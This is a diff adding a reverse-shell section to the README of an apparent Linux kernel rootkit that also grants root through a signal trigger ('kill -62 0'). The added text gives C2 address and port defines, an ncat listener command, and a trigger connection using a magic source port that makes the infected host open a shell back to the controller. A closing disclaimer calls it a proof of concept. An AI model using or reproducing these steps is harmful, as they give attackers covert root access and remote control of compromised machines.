@@ -42,6 +42,25 @@ nuvm@lkm:~$ kill -62 0
 nuvm@lkm:~$ lsmod | grep givemeroot
 ```
 
+## Reverse shell
+### Configuration
+Just edit the global variables
+```
+#define C2IP    "192.168.0.60"
+#define C2PORT  "9090"
+```
+and set your c2 hostname/ipaddr and port.
+### Usage
+Start a listener on your c2
+```bash
+ncat -lvp 9090
+```
+and start a tcp connection from your c2 with the host running the rookit on port 1339 with port 1337 as source port ( the server does not need to be listening on this port)
+```bash
+ncat -p 1337 192.168.0.101 1339
+```
+then the host will connect to your c2 using ncat
+
 # Disclaimer
 Using this module might cause severe damage to your system, it was created as a proof of concept and should never be used on a production system!
 
